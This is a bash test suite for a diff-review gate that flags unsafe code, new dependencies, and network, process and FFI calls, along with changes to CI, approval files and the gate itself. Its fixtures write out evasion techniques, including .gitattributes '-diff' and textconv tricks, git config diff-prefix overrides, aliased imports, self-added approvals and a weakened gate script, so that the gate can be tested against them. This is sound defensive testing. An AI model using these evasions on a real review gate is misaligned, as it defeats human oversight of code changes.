#!/usr/bin/env bash
# diff-gate-test.sh — fixture tests for scripts/diff-gate.sh.
# Builds throwaway git repos under target/ in this checkout and deletes them after.
# Run: scripts/tests/diff-gate-test.sh

set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
GATE="$ROOT/scripts/diff-gate.sh"
# DIFF_GATE_TEST_TMP puts the fixture repos elsewhere (a fast local disk); default target/.
TMPBASE="${DIFF_GATE_TEST_TMP:-$ROOT/target}"
mkdir -p "$TMPBASE"
WORK="$(mktemp -d "$TMPBASE/diff-gate-test.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT

# The token helper (tools/diff-gate-tokens) is a Rust binary. By default every fixture uses a
# stub that finds nothing, so this suite needs only bash and git. Set DIFF_GATE_TEST_TOKENS_BIN
# to a built helper to run every fixture against the real one (plus the "tokens(real)" cases).
STUB="$ROOT/scripts/tests/diff-gate-tokens-stub.sh"
export DIFF_GATE_TOKENS_BIN="${DIFF_GATE_TEST_TOKENS_BIN:-$STUB}"
REAL_TOKENS=0; [ -n "${DIFF_GATE_TEST_TOKENS_BIN:-}" ] && REAL_TOKENS=1

pass=0; fail=0; gaps=0
APPROVE_UNSAFE='[[approval]]
rule = "unsafe"
path = "src/**"
pattern = "*"
reason = "fixture"
approved_by = "owner"'

# case NAME EXPECTED_EXIT BASE_SNIPPET CHANGE_SNIPPET [ENV=VAL ...]
# Snippets run inside the fixture repo: BASE_SNIPPET before the base commit,
# CHANGE_SNIPPET before the change commit.
case_run() {
    local name="$1" want="$2" base_sh="$3" change_sh="$4"; shift 4
    # DIFF_GATE_TEST_FILTER=ERE runs only the case_run fixtures whose name matches (for iteration).
    if [ -n "${DIFF_GATE_TEST_FILTER:-}" ] && ! printf '%s\n' "$name" | grep -Eq -- "$DIFF_GATE_TEST_FILTER"; then return 0; fi
    local d="$WORK/$(echo "$name" | tr -c 'A-Za-z0-9\n' '_')"
    mkdir -p "$d" && cd "$d" || return
    git init -q . && git config user.email t@t && git config user.name t
    mkdir -p src config && printf 'pub fn a() {}\n' >src/lib.rs
    printf '[package]\nname = "fx"\n\n[dependencies]\nexisting = "1"\n' >Cargo.toml
    eval "$base_sh"
    git add -A && git commit -qm base && local base; base="$(git rev-parse HEAD)"
    eval "$change_sh"
    git add -A && git commit -qm change
    local out rc
    out="$(env DIFF_GATE_BASE="$base" "$@" "$GATE" 2>&1)"; rc=$?
    check_result "$name" "$want" "$rc" "$out"
    cd "$ROOT" || exit 2
}

# check_result NAME WANT RC OUT. With EXPECT="rule1 rule2" set, each rule must also be
# reported as a FAIL finding in OUT; with GREP="text", OUT must contain that text.
check_result() {
    local name="$1" want="$2" rc="$3" out="$4" r missing=""
    for r in ${EXPECT:-}; do
        echo "$out" | grep -Eq "^  FAIL +$r +" || missing="$missing $r"
    done
    if [ -n "${GREP:-}" ] && ! echo "$out" | grep -qF -- "$GREP"; then missing="$missing text:'$GREP'"; fi
    # KNOWN_GAP=<id>: the case states what the spec requires and the gate does not do yet. It is
    # reported as KNOWN-GAP (counted, not a failure); once the gate meets the spec it fails as
    # "fixed", so the marker gets removed. DIFF_GATE_TEST_STRICT_GAPS=1 makes gaps fail too.
    if [ -n "${KNOWN_GAP:-}" ]; then
        if [ "$rc" = "$want" ] && [ -z "$missing" ]; then
            fail=$((fail + 1)); printf '  FAIL  %s (KNOWN-GAP %s now behaves as the spec requires: remove the marker)\n' "$name" "$KNOWN_GAP"
        else
            gaps=$((gaps + 1)); [ "${DIFF_GATE_TEST_STRICT_GAPS:-0}" = 1 ] && fail=$((fail + 1))
            printf '  KNOWN-GAP %s  %s (exit %s, spec wants %s; missing FAIL:%s)\n' "$KNOWN_GAP" "$name" "$rc" "$want" "${missing:- none}"
            echo "$out" | grep -E '^diff-gate: (base|OK|REJECTED)|^  (FAIL|approved)' | head -4 | sed 's/^/        /'
        fi
        return 0
    fi
    if [ "$rc" = "$want" ] && [ -z "$missing" ]; then pass=$((pass + 1)); printf '  ok    %s\n' "$name"
    else fail=$((fail + 1)); printf '  FAIL  %s (exit %s, wanted %s; missing FAIL:%s)\n%s\n' "$name" "$rc" "$want" "${missing:- none}" "$out" | sed 's/^/        /'; fi
}

# fixture_repo DIR: an empty fixture repo with src/lib.rs, Cargo.toml and config/.
fixture_repo() {
    mkdir -p "$1" && cd "$1" || return 1
    git init -q . && git config user.email t@t && git config user.name t
    mkdir -p src config && printf 'pub fn a() {}\n' >src/lib.rs
    printf '[package]\nname = "fx"\n\n[dependencies]\nexisting = "1"\n' >Cargo.toml
}

echo "diff-gate fixtures"
# clean and comments/strings
case_run "clean docs-only diff passes" 0 : 'echo hi >README.md'
case_run "unsafe in a comment passes" 0 : 'echo "// unsafe { x }" >>src/lib.rs'
case_run "unsafe in a string passes" 0 : 'echo "const S: &str = \"unsafe\";" >>src/lib.rs'
# An inner attribute must come before any item (rustc rejects it later, and so does the
# token helper's parse check), so this one is prepended.
case_run "unsafe_code attribute passes" 0 : '{ echo "#![forbid(unsafe_code)]"; cat src/lib.rs; } >src/l.tmp && mv src/l.tmp src/lib.rs'

# each rule: added -> fail, already on base -> pass
case_run "unsafe added fails" 1 : 'echo "fn f() { unsafe { g() } }" >>src/lib.rs'
case_run "unsafe on base passes" 0 'echo "fn f() { unsafe { g() } }" >>src/lib.rs' 'echo "fn z() {}" >>src/lib.rs'
case_run "new-dep added fails" 1 : 'printf "serde = \"1\"\n" >>Cargo.toml'
case_run "new-dep already on base passes" 0 'printf "serde = \"1\"\n" >>Cargo.toml' 'sed -i.bak "s/serde = \"1\"/serde = \"1.1\"/" Cargo.toml; rm Cargo.toml.bak'
case_run "new-dep changed git source fails" 1 'printf "foo = { git = \"https://a\" }\n" >>Cargo.toml' 'sed -i.bak "s#https://a#https://b#" Cargo.toml; rm Cargo.toml.bak'
case_run "new-dep dev table fails" 1 : 'printf "\n[dev-dependencies]\ntempfile = \"3\"\n" >>Cargo.toml'
case_run "new-dep table form fails" 1 : 'printf "\n[dependencies.tokio]\nversion = \"1\"\n" >>Cargo.toml'
case_run "new-dep target table fails" 1 : 'printf "\n[target.\x27cfg(unix)\x27.dependencies]\nlibc = \"0.2\"\n" >>Cargo.toml'
case_run "new-dep workspace table fails" 1 : 'printf "\n[workspace.dependencies]\nserde = \"1\"\n" >>Cargo.toml'
case_run "new-dep workspace=true of known dep passes" 0 \
    'printf "\n[workspace.dependencies]\nserde = \"1\"\n" >Cargo.toml' \
    'mkdir -p crates/x && printf "[package]\nname=\"x\"\n[dependencies]\nserde = { workspace = true }\n" >crates/x/Cargo.toml'
case_run "build.rs added fails" 1 : 'echo "fn main() {}" >build.rs'
case_run "build.rs on base passes" 0 'echo "fn main() {}" >build.rs' 'echo "// x" >>build.rs'
case_run "build key in Cargo.toml fails" 1 : 'sed -i.bak "s/^name = \"fx\"/name = \"fx\"\nbuild = \"b.rs\"/" Cargo.toml; rm Cargo.toml.bak'
case_run "proc-macro added fails" 1 : 'printf "\n[lib]\nproc-macro = true\n" >>Cargo.toml'
case_run "proc-macro on base passes" 0 'printf "\n[lib]\nproc-macro = true\n" >>Cargo.toml' 'echo hi >README.md'
case_run "net TcpStream added fails" 1 : 'echo "use std::net::TcpStream;" >>src/lib.rs'
case_run "net reqwest added fails" 1 : 'echo "fn g() { let _ = reqwest::Client::new(); }" >>src/lib.rs'
case_run "net address types only passes" 0 : 'echo "use std::net::{IpAddr, SocketAddr};" >>src/lib.rs'
case_run "net on base passes" 0 'echo "use std::net::UdpSocket;" >>src/lib.rs' 'echo "fn z() {}" >>src/lib.rs'
case_run "process Command::new added fails" 1 : 'echo "fn g() { std::process::Command::new(\"ls\"); }" >>src/lib.rs'
case_run "process tokio added fails" 1 : 'echo "use tokio::process::Child;" >>src/lib.rs'
case_run "process on base passes" 0 'echo "fn g() { Command::new(\"ls\"); }" >>src/lib.rs' 'echo "fn z() {}" >>src/lib.rs'
case_run "ffi extern C added fails" 1 : 'echo "extern \"C\" { fn abs(x: i32) -> i32; }" >>src/lib.rs'
case_run "ffi no_mangle added fails" 1 : 'echo "#[no_mangle] pub fn q() {}" >>src/lib.rs'
case_run "ffi on base passes" 0 'echo "#[no_mangle] pub fn q() {}" >>src/lib.rs' 'echo "fn z() {}" >>src/lib.rs'
case_run "ci-workflow added fails" 1 : 'mkdir -p .github/workflows && echo "name: x" >.github/workflows/x.yml'
case_run "ci-workflow edited fails" 1 'mkdir -p .github/workflows && echo "name: x" >.github/workflows/x.yml' 'echo "# c" >>.github/workflows/x.yml'
case_run "gate script change fails" 1 'mkdir -p scripts && echo "#!/bin/sh" >scripts/diff-gate.sh' 'echo "# weaker" >>scripts/diff-gate.sh'

# approvals
case_run "approved entry passes" 0 "printf '%s\n' '$APPROVE_UNSAFE' >config/diff-gate-approvals.toml" 'echo "fn f() { unsafe { g() } }" >>src/lib.rs'
case_run "approval for other path does not pass" 1 \
    "printf '%s\n' '$APPROVE_UNSAFE' | sed 's#src/\*\*#other/**#' >config/diff-gate-approvals.toml" 'echo "fn f() { unsafe { g() } }" >>src/lib.rs'
export APPROVE_REGEX="[[approval]]
rule = \"unsafe\"
path = \"src/*.rs\"
pattern = 'unsafe \\{ g\\('
reason = \"r\"
approved_by = \"o\""
case_run "approval pattern is a regex on the line" 0 'printf "%s\n" "$APPROVE_REGEX" >config/diff-gate-approvals.toml' 'echo "fn f() { unsafe { g() } }" >>src/lib.rs'
case_run "approvals-change fails without owner flag" 1 : "printf '%s\n' '$APPROVE_UNSAFE' >config/diff-gate-approvals.toml"
case_run "approvals-change passes with owner flag" 0 : "printf '%s\n' '$APPROVE_UNSAFE' >config/diff-gate-approvals.toml" DIFF_GATE_OWNER_APPROVED=1
case_run "agent adds approval plus violation fails" 1 : \
    "printf '%s\n' '$APPROVE_UNSAFE' >config/diff-gate-approvals.toml; echo 'fn f() { unsafe { g() } }' >>src/lib.rs"
case_run "owner adds approval plus violation passes" 0 : \
    "printf '%s\n' '$APPROVE_UNSAFE' >config/diff-gate-approvals.toml; echo 'fn f() { unsafe { g() } }' >>src/lib.rs" DIFF_GATE_OWNER_APPROVED=1
case_run "malformed approval is a setup error" 2 \
    "printf '[[approval]]\nrule = \"unsafe\"\n' >config/diff-gate-approvals.toml" 'echo hi >README.md'

# owner ledger (config/diff-gate-owner-ledger.toml): rows the owner already approved
# Canonical row text and hash are pinned here independently of the gate.
row_sha() { # rule path pattern reason approved_by
    printf 'rule=%s\npath=%s\npattern=%s\nreason=%s\napproved_by=%s\n' "$@" |
        { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi; } | cut -d' ' -f1
}
H_UNSAFE="$(row_sha unsafe 'src/**' '*' fixture owner)"
H_NARROW="$(row_sha unsafe 'src/lib.rs' '*' fixture owner)"
H_OTHER="$(row_sha net 'src/**' '*' fixture owner)"
export LEDGER_UNSAFE="[[entry]]
decision = \"owner-2026-11-14-test\"
date     = \"2026-11-14\"
sha256   = \"$H_UNSAFE\""
export LEDGER_NARROW="[[entry]]
decision = \"owner-2026-11-14-narrow\"
date     = \"2026-11-14\"
sha256   = \"$H_NARROW\""
export LEDGER_OTHER="[[entry]]
decision = \"owner-2026-11-14-other\"
date     = \"2026-11-14\"
sha256   = \"$H_OTHER\""
export APPROVE_UNSAFE
export APPROVE_NARROW="$(printf '%s\n' "$APPROVE_UNSAFE" | sed 's#src/\*\*#src/lib.rs#')"
L=config/diff-gate-owner-ledger.toml
A=config/diff-gate-approvals.toml
case_run "ledger: added row on base ledger passes" 0 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A
case_run "ledger: added row on base ledger applies to the same diff" 0 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A'; echo "fn f() { unsafe { g() } }" >>src/lib.rs'
case_run "ledger: added row plus comment lines passes" 0 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L \
    'printf "# owner 2026-11-14\n%s\n" "$APPROVE_UNSAFE" >'$A
case_run "ledger: comment-only approvals edit passes" 0 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n" "$APPROVE_UNSAFE" >'$A \
    'printf "# note\n" >>'$A
case_run "ledger: reordered rows pass" 0 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n\n%s\n" "$APPROVE_UNSAFE" "$APPROVE_NARROW" >'$A \
    'printf "%s\n\n%s\n" "$APPROVE_NARROW" "$APPROVE_UNSAFE" >'$A
case_run "ledger: added row with no entry fails" 1 \
    'printf "%s\n" "$LEDGER_OTHER" >'$L \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A
case_run "ledger: added row with no ledger file fails" 1 : \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A
case_run "ledger: one matching and one unmatched row fails" 1 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L \
    'printf "%s\n\n%s\n" "$APPROVE_UNSAFE" "$APPROVE_NARROW" >'$A
case_run "ledger: removed row fails" 1 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n" "$APPROVE_UNSAFE" >'$A \
    'printf "# emptied\n" >'$A
case_run "ledger: deleted approvals file fails" 1 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n" "$APPROVE_UNSAFE" >'$A \
    'rm '$A
case_run "ledger: loosened row fails even when the wider row is on the ledger" 1 \
    'printf "%s\n\n%s\n" "$LEDGER_UNSAFE" "$LEDGER_NARROW" >'$L'; printf "%s\n" "$APPROVE_NARROW" >'$A \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A
case_run "ledger: edited reason fails" 1 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n" "$APPROVE_UNSAFE" >'$A \
    'sed -i.bak "s/fixture/edited/" '$A'; rm '$A'.bak'
case_run "ledger: entry and row added in the same diff fails" 1 : \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n" "$APPROVE_UNSAFE" >'$A
case_run "ledger: ledger-only edit fails" 1 \
    'printf "%s\n" "$LEDGER_OTHER" >'$L \
    'printf "\n%s\n" "$LEDGER_UNSAFE" >>'$L
case_run "ledger: ledger deleted fails" 1 \
    'printf "%s\n" "$LEDGER_OTHER" >'$L \
    'rm '$L
case_run "ledger: gate script edit fails with ledger present" 1 \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; mkdir -p scripts && echo "#!/bin/sh" >scripts/diff-gate.sh' \
    'echo "# weaker" >>scripts/diff-gate.sh'
case_run "ledger: gate script renamed away fails" 1 \
    'mkdir -p scripts && echo "#!/bin/sh" >scripts/diff-gate.sh' \
    'git mv scripts/diff-gate.sh scripts/other.sh'
case_run "ledger: malformed base ledger is a setup error" 2 \
    'printf "[[entry]]\ndecision = \"x\"\nsha256 = \"abc\"\n" >'$L 'echo hi >README.md'
case_run "override: added row with no entry passes" 0 : \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A DIFF_GATE_OWNER_APPROVED=1
case_run "override: removed row passes" 0 \
    'printf "%s\n" "$APPROVE_UNSAFE" >'$A 'printf "# emptied\n" >'$A DIFF_GATE_OWNER_APPROVED=1
case_run "override: loosened row passes" 0 \
    'printf "%s\n" "$APPROVE_NARROW" >'$A 'printf "%s\n" "$APPROVE_UNSAFE" >'$A DIFF_GATE_OWNER_APPROVED=1
case_run "override: ledger edit passes" 0 : \
    'printf "%s\n" "$LEDGER_UNSAFE" >'$L'; printf "%s\n" "$APPROVE_UNSAFE" >'$A DIFF_GATE_OWNER_APPROVED=1
case_run "override: gate script edit still fails" 1 \
    'mkdir -p scripts && echo "#!/bin/sh" >scripts/diff-gate.sh' 'echo "# weaker" >>scripts/diff-gate.sh' DIFF_GATE_OWNER_APPROVED=1

# --ledger-hash prints the canonical hash the ledger expects
d="$WORK/ledger_hash" && mkdir -p "$d/config" && cd "$d" && git init -q . && git config user.email t@t && git config user.name t
printf '%s\n' "$APPROVE_UNSAFE" >config/diff-gate-approvals.toml
out="$("$GATE" --ledger-hash 2>&1)"; rc=$?
if [ "$rc" = 0 ] && echo "$out" | grep -q "^$H_UNSAFE"; then pass=$((pass + 1)); echo "  ok    --ledger-hash prints the canonical row hash"; else fail=$((fail + 1)); echo "  FAIL  --ledger-hash: rc=$rc $out"; fi
cd "$ROOT" || exit 2

# json output and worktree mode
d="$WORK/json" && mkdir -p "$d" && cd "$d" && git init -q . && git config user.email t@t && git config user.name t
mkdir src && echo "pub fn a() {}" >src/lib.rs && git add -A && git commit -qm base
base="$(git rev-parse HEAD)"
echo "fn f() { unsafe { g() } }" >>src/lib.rs
out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree --json 2>&1)"; rc=$?
if [ "$rc" = 1 ] && echo "$out" | grep -q '"failed":1' && echo "$out" | grep -q '"rule":"unsafe"'; then pass=$((pass + 1)); echo "  ok    worktree + json reports tracked change"; else fail=$((fail + 1)); echo "  FAIL  worktree + json: rc=$rc $out"; fi
git checkout -q src/lib.rs; echo "fn f() { unsafe { g() } }" >src/new.rs
DIFF_GATE_BASE="$base" "$GATE" --worktree >/dev/null 2>&1; rc=$?
DIFF_GATE_BASE="$base" "$GATE" >/dev/null 2>&1; rc2=$?
if [ "$rc" = 1 ] && [ "$rc2" = 0 ]; then pass=$((pass + 1)); echo "  ok    worktree sees untracked files, default mode does not"; else fail=$((fail + 1)); echo "  FAIL  untracked: worktree rc=$rc default rc=$rc2"; fi
cd "$ROOT" || exit 2

# review hardening (2026-11-15)
# 1. .gitattributes must not hide hunks: "*.rs -diff" makes plain git diff print "Binary files differ".
VIOL='echo "fn f() { unsafe { g() } }" >>src/lib.rs; echo "fn h() { std::process::Command::new(\"sh\"); }" >>src/lib.rs'
EXPECT="unsafe process" case_run "gitattributes -diff on base still shows unsafe and process" 1 \
    'echo "*.rs -diff" >.gitattributes' "$VIOL"
EXPECT="unsafe process gitattributes-change" case_run "gitattributes -diff added with violations fails on all three" 1 : \
    'echo "*.rs -diff" >.gitattributes; '"$VIOL"
EXPECT="unsafe" case_run "gitattributes binary macro on base still shows unsafe" 1 \
    'echo "*.rs binary" >.gitattributes' 'echo "fn f() { unsafe { g() } }" >>src/lib.rs'
EXPECT="unsafe" case_run "gitattributes textconv driver on base still shows unsafe" 1 \
    'echo "*.rs diff=hide" >.gitattributes; git config diff.hide.textconv "sed s/unsafe/safe/"' \
    'echo "fn f() { unsafe { g() } }" >>src/lib.rs'
EXPECT="gitattributes-change" case_run "gitattributes added alone fails" 1 : 'echo "*.md text" >.gitattributes'
EXPECT="gitattributes-change" case_run "nested gitattributes edited fails" 1 \
    'mkdir -p crates/x && echo "*.md text" >crates/x/.gitattributes' 'echo "*.rs -diff" >>crates/x/.gitattributes'
EXPECT="gitattributes-change" case_run "gitattributes deleted fails" 1 'echo "*.md text" >.gitattributes' 'git rm -q .gitattributes'
export APPROVE_GA='[[approval]]
rule = "gitattributes-change"
path = ".gitattributes"
pattern = "*"
reason = "fixture"
approved_by = "owner"'
case_run "gitattributes change approved by a row passes" 0 'printf "%s\n" "$APPROVE_GA" >config/diff-gate-approvals.toml' \
    'echo "*.md text" >.gitattributes'
EXPECT="gitattributes-change" case_run "override does not approve gitattributes-change" 1 : \
    'echo "*.md text" >.gitattributes' DIFF_GATE_OWNER_APPROVED=1

# worktree mode: tracked and untracked (--no-index) files under a -diff attribute
d="$WORK/ga_worktree" && fixture_repo "$d" && echo "*.rs -diff" >.gitattributes && git add -A && git commit -qm base
base="$(git rev-parse HEAD)"
echo "fn f() { unsafe { g() } }" >>src/lib.rs
out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
EXPECT="unsafe" check_result "worktree: gitattributes -diff tracked change still shows unsafe" 1 "$rc" "$out"
git checkout -q src/lib.rs; echo "fn h() { std::process::Command::new(\"sh\"); }" >src/new.rs
out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
EXPECT="process" check_result "worktree: gitattributes -diff untracked file still shows process" 1 "$rc" "$out"
cd "$ROOT" || exit 2

# 2. The ledger is read at the target tip, so revoking an entry there takes effect for
#    branches forked before the revoke.
d="$WORK/ledger_revoke" && fixture_repo "$d"
git add -A && git commit -qm root && git branch -q -M main
printf '%s\n' "$LEDGER_UNSAFE" >$L && git add -A && git commit -qm "L: add entry E"
git checkout -q -b X && printf '%s\n' "$APPROVE_UNSAFE" >$A && git add -A && git commit -qm "X: add row R"
git checkout -q main && printf '# revoked\n' >$L && git add -A && git commit -qm "T: revoke E"
git checkout -q X
out="$("$GATE" --base main --head X 2>&1)"; rc=$?
EXPECT="approvals-change" check_result "ledger: entry revoked on the target tip no longer approves" 1 "$rc" "$out"
out="$("$GATE" --base main~1 --head X 2>&1)"; rc=$?
check_result "ledger: control, same branch against the pre-revoke tip passes" 0 "$rc" "$out"
cd "$ROOT" || exit 2

d="$WORK/ledger_tip_add" && fixture_repo "$d"
git add -A && git commit -qm root && git branch -q -M main
git checkout -q -b X && printf '%s\n' "$APPROVE_UNSAFE" >$A && git add -A && git commit -qm "X: add row R"
git checkout -q main && mkdir -p config && printf '%s\n' "$LEDGER_UNSAFE" >$L && git add -A && git commit -qm "T: add entry E"
git checkout -q X
out="$("$GATE" --base main --head X 2>&1)"; rc=$?
check_result "ledger: entry landed on the tip after the fork approves" 0 "$rc" "$out"
cd "$ROOT" || exit 2

# 3. Classification reads approvals from the head commit, not the checkout.
d="$WORK/head_approvals" && fixture_repo "$d"
git add -A && git commit -qm base && git branch -q -M main && base="$(git rev-parse HEAD)"
git checkout -q -b C && echo "fn f() { unsafe { g() } }" >>src/lib.rs && git add -A && git commit -qm "C: unsafe"
git checkout -q -b wide main && printf '%s\n' "$APPROVE_UNSAFE" >$A && git add -A && git commit -qm "wide approvals"
out="$("$GATE" --base "$base" --head C 2>&1)"; rc=$?
EXPECT="unsafe" check_result "head: approvals in the checkout do not approve a different --head" 1 "$rc" "$out"
git checkout -q C && mkdir -p config && printf '%s\n' "$APPROVE_UNSAFE" >$A
out="$("$GATE" --base "$base" 2>&1)"; rc=$?
EXPECT="unsafe" check_result "head: uncommitted approvals do not approve HEAD in commit mode" 1 "$rc" "$out"
out="$("$GATE" --base "$base" --worktree 2>&1)"; rc=$?
EXPECT="approvals-change" check_result "head: --worktree reads the working-tree approvals and flags the change" 1 "$rc" "$out"
cd "$ROOT" || exit 2

# content-layer hardening (2026-11-15): each case below exited 0 before the fix.
# 5. Lexer: comment-looking lines, char/raw-string quotes, multi-line strings, aliases.
EXPECT="unsafe" case_run "lexer: line starting with * is scanned" 1 : 'printf "fn f(p: *mut u8) {\n    *p = unsafe { std::ptr::read(p) };\n}\n" >>src/lib.rs'
EXPECT="unsafe" case_run "lexer: line starting with an empty block comment is scanned" 1 : 'echo "/**/ fn f(p: *const u8) { let _s = unsafe { *p }; }" >>src/lib.rs'
EXPECT="unsafe" case_run "lexer: escaped quote char literal does not open a string" 1 : \
    "printf '%s\n' 'fn f() { let _c = '\\''\\\"'\\''; unsafe { x() }; let _d = \"\"; }' >>src/lib.rs"
EXPECT="process" case_run "lexer: raw string ending in a backslash" 1 : \
    "printf '%s\n' 'fn f() { let _r = r\"\\\"; let _k = std::process::Command::new(\"sh\"); let _e = \"\"; }' >>src/lib.rs"
EXPECT="unsafe" case_run "lexer: code after a multi-line string closes" 1 : \
    "printf '%s\n' 'const S: &str = \"abc' 'def\"; fn g() { unsafe { x() } } const T: &str = \"' '\";' >>src/lib.rs"
EXPECT="unsafe" case_run "lexer: lifetimes are not char literals" 1 : \
    "printf '%s\n' 'fn f<'\\''a>(x: &'\\''a str) -> &'\\''a str { unsafe { y(x) } }' >>src/lib.rs"
case_run "lexer: char literal, raw string and nested comment content still ignored" 0 : \
    "printf '%s\n' 'fn f() { let _c = '\\''\\\"'\\''; let _r = r#\"unsafe \"Command::new\" \"#; /* a /* unsafe */ TcpStream */ }' >>src/lib.rs"
EXPECT="process" case_run "alias: Command imported under another name" 1 : 'echo "use std::{process::Command as K}; fn f() { K::new(\"sh\"); }" >>src/lib.rs'
EXPECT="net" case_run "net: tokio TcpSocket" 1 : 'echo "fn f() { let _ = tokio::net::TcpSocket::new_v4(); }" >>src/lib.rs'
EXPECT="ffi" case_run "ffi: extern system fn" 1 : 'echo "extern \"system\" fn f() {}" >>src/lib.rs'
EXPECT="ffi" case_run "ffi: bare extern block" 1 : 'echo "extern { fn abs(x: i32) -> i32; }" >>src/lib.rs'
case_run "ffi: extern crate is not ffi" 0 : 'echo "extern crate alloc;" >>src/lib.rs'

# 6. One approval match per finding occurrence on a line.
export APPROVE_CANDLE="[[approval]]
rule = \"unsafe\"
path = \"src/*.rs\"
pattern = 'unsafe \\{ std::env::set_var\\(\"CANDLE_METAL_ENABLE_FAST_MATH\", value\\) \\};'
reason = \"r\"
approved_by = \"o\""
CANDLE_OK='fn f(value: &str) { unsafe { std::env::set_var("CANDLE_METAL_ENABLE_FAST_MATH", value) }; }'
CANDLE_BAD='fn f(value: &str) { unsafe { std::env::set_var("CANDLE_METAL_ENABLE_FAST_MATH", value) }; unsafe { core::ptr::write_volatile(0x1 as *mut u8, 0) }; }'
export CANDLE_OK CANDLE_BAD
case_run "occurrence: candle row still approves its own line" 0 'printf "%s\n" "$APPROVE_CANDLE" >config/diff-gate-approvals.toml' 'printf "%s\n" "$CANDLE_OK" >>src/lib.rs'
EXPECT="unsafe" case_run "occurrence: candle row does not approve a second unsafe on the line" 1 \
    'printf "%s\n" "$APPROVE_CANDLE" >config/diff-gate-approvals.toml' 'printf "%s\n" "$CANDLE_BAD" >>src/lib.rs'
EXPECT="unsafe" case_run "occurrence: regex row does not approve a second unsafe on the line" 1 \
    'printf "%s\n" "$APPROVE_REGEX" >config/diff-gate-approvals.toml' 'echo "fn f() { unsafe { g() }; unsafe { h() } }" >>src/lib.rs'
export APPROVE_LISTENER='[[approval]]
rule = "net"
path = "src/lib.rs"
pattern = "TcpListener"
reason = "r"
approved_by = "o"'
case_run "occurrence: one path expression is one occurrence" 0 'printf "%s\n" "$APPROVE_LISTENER" >config/diff-gate-approvals.toml' \
    'echo "fn f() { let _l = std::net::TcpListener::bind(\"127.0.0.1:0\"); }" >>src/lib.rs'
EXPECT="net" case_run "occurrence: second net call on the line needs its own approval" 1 'printf "%s\n" "$APPROVE_LISTENER" >config/diff-gate-approvals.toml' \
    'echo "fn f() { let _l = std::net::TcpListener::bind(\"127.0.0.1:0\"); let _s = std::net::UdpSocket::bind(\"0.0.0.0:0\"); }" >>src/lib.rs'

# 7. A path containing " b/" is reported under its own path.
export APPROVE_HOSTED='[[approval]]
rule = "net"
path = "crates/k/hosted.rs"
pattern = "*"
reason = "r"
approved_by = "o"'
EXPECT="net" case_run "path: \" b/\" inside a path is not split" 1 'printf "%s\n" "$APPROVE_HOSTED" >config/diff-gate-approvals.toml' \
    'mkdir -p "src/x b/crates/k" && echo "fn f() { let _ = reqwest::Client::new(); }" >"src/x b/crates/k/hosted.rs"'

# 8. Git config that changes diff output is neutralised.
VIOL1='printf "serde = \"1\"\n" >>Cargo.toml; mkdir -p .github/workflows && echo "name: x" >.github/workflows/x.yml; echo "fn f() { unsafe { g() } }" >>src/lib.rs'
EXPECT="new-dep ci-workflow unsafe" case_run "config: diff.noprefix=true" 1 : "$VIOL1" GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=diff.noprefix GIT_CONFIG_VALUE_0=true
EXPECT="new-dep ci-workflow unsafe" case_run "config: diff.mnemonicPrefix=true" 1 : "$VIOL1" GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=diff.mnemonicPrefix GIT_CONFIG_VALUE_0=true
EXPECT="new-dep ci-workflow unsafe" case_run "config: diff.srcPrefix and dstPrefix" 1 : "$VIOL1" GIT_CONFIG_COUNT=2 GIT_CONFIG_KEY_0=diff.srcPrefix GIT_CONFIG_VALUE_0=x/ GIT_CONFIG_KEY_1=diff.dstPrefix GIT_CONFIG_VALUE_1=y/
EXPECT="new-dep ci-workflow unsafe" case_run "config: color.ui=always and diff.interHunkContext" 1 : "$VIOL1" GIT_CONFIG_COUNT=2 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=always GIT_CONFIG_KEY_1=diff.interHunkContext GIT_CONFIG_VALUE_1=9
EXPECT="unsafe" case_run "config: core.quotePath with a non-ASCII path" 1 : 'printf "fn f() { unsafe { g() } }\n" >src/é.rs' GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.quotePath GIT_CONFIG_VALUE_0=true
d="$WORK/noprefix_path" && fixture_repo "$d" && git add -A && git commit -qm base && base="$(git rev-parse HEAD)"
echo "fn f() { unsafe { g() } }" >>src/lib.rs && git add -A && git commit -qm change
out="$(DIFF_GATE_BASE="$base" GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=diff.noprefix GIT_CONFIG_VALUE_0=true "$GATE" 2>&1)"; rc=$?
echo "$out" | grep -q ' src/lib.rs:2$' || rc="bad-path"
EXPECT="unsafe" check_result "config: diff.noprefix still reports the real path" 1 "$rc" "$out"
cd "$ROOT" || exit 2

# 9. git diff failures fail closed.
d="$WORK/diff_fails" && fixture_repo "$d" && git add -A && git commit -qm base && base="$(git rev-parse HEAD)"
echo "fn f() { unsafe { g() } }" >src/evil.rs && git add -A && git commit -qm change
blob="$(git rev-parse HEAD:src/evil.rs)" && rm -f ".git/objects/${blob:0:2}/${blob:2}"
out="$(DIFF_GATE_BASE="$base" "$GATE" 2>&1)"; rc=$?
check_result "fail closed: unreadable blob makes git diff fail" 2 "$rc" "$out"
cd "$ROOT" || exit 2

